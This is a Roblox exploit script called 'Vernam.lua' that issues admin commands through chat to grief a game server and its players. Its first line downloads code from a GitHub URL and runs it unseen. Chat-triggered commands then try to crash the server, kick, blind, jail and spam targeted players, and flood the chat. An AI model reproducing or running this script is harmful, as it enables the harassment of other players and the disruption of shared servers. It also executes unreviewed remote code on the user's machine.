loadstring(game:HttpGet('https://raw.githubusercontent.com/ily123950/scv3/main/var'))()
game.Players:Chat("h \n \n \n \n \n \n Vernam has been executed.")
game.Players:Chat("!gearannounce disable")
local isAntigearEnabled = false
local playerJoinEnabled = true
local isPlayerLeaveEnabled = true

game.Players.PlayerAdded:Connect(function(player)
    if playerJoinEnabled then
        local message = "h \n \n \n \n \n \n -------------" .. player.Name .. " joined the server! .>!"
        game.Players:Chat(message)
        if player.Name == game.Players.LocalPlayer.Name then
            game.Players:Chat("!gearannounce disable")
        end
    end
end)

game.Players.PlayerRemoving:Connect(function(player)
    if isPlayerLeaveEnabled then
        local message = "h \n \n \n \n \n \n " .. player.Name .. " left the server! .1>.!-------"
        game.Players:Chat(message)
    end
end)

game.Players.LocalPlayer.Chatted:Connect(function(msg)
    local lowerMsg = msg:lower()
    
    if lowerMsg == ".disableplrleave" then
        isPlayerLeaveEnabled = false
    elseif lowerMsg == ".enableplrleave" then
        isPlayerLeaveEnabled = true
    elseif lowerMsg == ".disableplrjoin" then
        playerJoinEnabled = false
    elseif lowerMsg == ".enableplrjoin" then
        playerJoinEnabled = true
    elseif lowerMsg == ".credits" then
        local message = "h \n \n \n \n \n \n  Vernam was coded by user. >Vernam.lua  -------------"
        game.Players:Chat(message)
    elseif lowerMsg == ".all" then
        game.Players:Chat(".antiblind")
        wait(0.1)
        game.Players:Chat(".antimsg")
        wait(0.1)
        game.Players:Chat(".permap")
        wait(0.1)
        game.Players:Chat(".nok")
        wait(0.1)
        game.Players:Chat(".antikill")
    elseif lowerMsg == ".antigear" then
        game.Players:Chat(".spam ungear/others")
        wait(0.1)
        game.Players:Chat("h \n \n \n \n \n \n Anti gear is now on. >Vernam.lua")
        isAntigearEnabled = true
    elseif lowerMsg == ".unantigear" then
        game.Players:Chat(".stop")
        wait(0.1)
        game.Players:Chat("h \n \n \n \n \n \n Anti gear is now off. >Vernam.lua")
        isAntigearEnabled = false
    elseif lowerMsg == ".rcrash" then
        game.Players:Chat("h \n \n \n \n \n \n please join another server.")
        game.Players:Chat("respawn others")
        game.Players:Chat("time 1")
        game.Players:Chat("brightness nan")
        wait(0.1)
        game.Players:Chat("!rcrash")
        wait(2)
        game.Players:Chat("!rcrash")
    elseif lowerMsg:sub(1, 5) == ".nuke" then
        local lp = game:GetService("Players").LocalPlayer
        game.Players:Chat(".spam gear me 11563251")
        wait(1)
        game.Players:Chat(".usetools")
        wait(0.2)
        game.Players:Chat(".stop")
        
        for i, tool in pairs(lp.Backpack:GetChildren()) do
            if tool:IsA("Tool") then
                tool.Parent = lp.Character
                tool:Activate()
                task.wait()
                tool.Parent = lp.Backpack
            end
        end
    elseif lowerMsg:sub(1, 3) == ".eg" and #lowerMsg > 3 then
        local letter = lowerMsg:sub(5, 5)
        game.Players:Chat("blind " .. letter)
        game.Players:Chat("respawn " .. letter)
        game.Players:Chat(".punish2 " .. letter)
        game.Players:Chat(".setspamdelay 0.4")
        wait(6)
        game.Players:Chat(".setspamdelay 0.0000001")
        game.Players:Chat(".stop")
        game.Players:Chat(".spam pm " .. letter .. " sorry, just a test.")
    elseif lowerMsg:sub(1, 2) == ".d" and #lowerMsg > 2 then
        local letter = lowerMsg:sub(4, 4)
        game.Players:Chat("respawn " .. letter)
        wait(1)
        game.Players:Chat("skydive me")
        wait(0.3)
        game.Players:Chat("skydive me")
        wait(0.3)
        game.Players:Chat("skydive me")
        wait(0.3)
        game.Players:Chat("skydive me")
        wait(0.3)
        game.Players:Chat("skydive me")
        wait(0.3)
        game.Players:Chat("jail me")
        wait(0.3)
        game.Players:Chat(".viewpart baseplate")
        wait(1)
        game.Players:Chat("removejails")
        wait(1)
        game.Players:Chat("respawn me")
        wait(1)
        game.Players:Chat(".rkick " .. letter)
        wait(4)
        game.Players:Chat(".rkick " .. letter)
    end
end)
local function executeCommands()
    game.Players:Chat(".spam gear GAMERNOOBIKYT 79446473")
    wait(5)
    game.Players:Chat(".stop")
end

local function equipAndUnequipTools(player)
    local backpack = player.Backpack
    if not backpack then
        return
    end
    
    local tools = {}
    for _, tool in pairs(backpack:GetChildren()) do
        if tool:IsA("Tool") then
            table.insert(tools, tool)
        end
    end
    
    if #tools == 0 then
        return -- No tools in the backpack
    end
    
    local currentIndex = 1
    while true do
        tools[currentIndex].Parent = player.Character
        wait(0.000000000000000000001) -- Adjust the wait time to control how long the tool is equipped
        tools[currentIndex].Parent = backpack
    
        currentIndex = currentIndex % #tools + 1
    end
end

game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg:lower() == ".betatoolorb" then
        local plr = game:GetService("Players").LocalPlayer
        plr.Character.Humanoid:UnequipTools()

        executeCommands() -- Execute the commands automatically

        local Tools = plr.Backpack:GetChildren()
        local numTools = #Tools
        local radiusOuter = 4 -- Adjust the outer radius of the star
        local radiusInner = 1.5 -- Adjust the inner radius of the star

        for i, tool in ipairs(Tools) do
            local angle = (2 * math.pi / numTools) * i
            local xOuter = math.cos(angle) * radiusOuter
            local zOuter = math.sin(angle) * radiusOuter
            local xInner = math.cos(angle + math.pi/numTools) * radiusInner
            local zInner = math.sin(angle + math.pi/numTools) * radiusInner

            tool.Grip = CFrame.new(xOuter, 0, zOuter) + Vector3.new(xInner, 0, zInner)
            tool.Parent = plr.Character
        end

        wait(0.1) -- Delay for 1 second

        plr.Character.Humanoid:UnequipTools()

        equipAndUnequipTools(plr) -- Call the function for the specific player
    end
    
    if msg:lower() == ".rails" then
        game.Players:Chat(".spam gear GAMERNOOBIKYT 79446473")
        wait(2)
        game.Players:Chat(".stop")

        wait(0.1) -- Delay for 2 seconds before executing the additional script

        local plr = game:GetService("Players").LocalPlayer
        plr.Character.Humanoid:UnequipTools()

        local Tools = plr.Backpack:GetChildren()
        local spiralRadius = 6
        local spiralHeight = -40
        local spiralOffset = 0.5
        local angleIncrement = 15

        for i, tool in ipairs(Tools) do
            local angle = math.rad(angleIncrement * i)
            local xPos = spiralRadius * math.cos(angle)
            local zPos = spiralRadius * math.sin(angle)

            tool.Grip = CFrame.new(xPos, spiralHeight + (i * spiralOffset), zPos) * CFrame.Angles(0, angle, 0)
            tool.Parent = plr.Character
        end
    end
    
    if msg:lower() == ".vgcrash" then
        local message = "h \n \n \n \n \n \n ------------- server crashed. >Vernam.lua-------------"
        game.Players:Chat(message)
    end
    
    if isAntigearEnabled and msg:lower():find("gear me") then
        local playerName = game.Players.LocalPlayer.Name
        local message = "h \n \n \n \n \n \n " .. playerName .. " was trying to crash the server. >Vernam.lua-------------"
        game.Players:Chat(message)
        game.Players:Chat(".spam pm " .. playerName .. " You have been punished.")
        wait(0.3)
        game.Players:Chat(".spam blind " .. playerName)
    end
end)
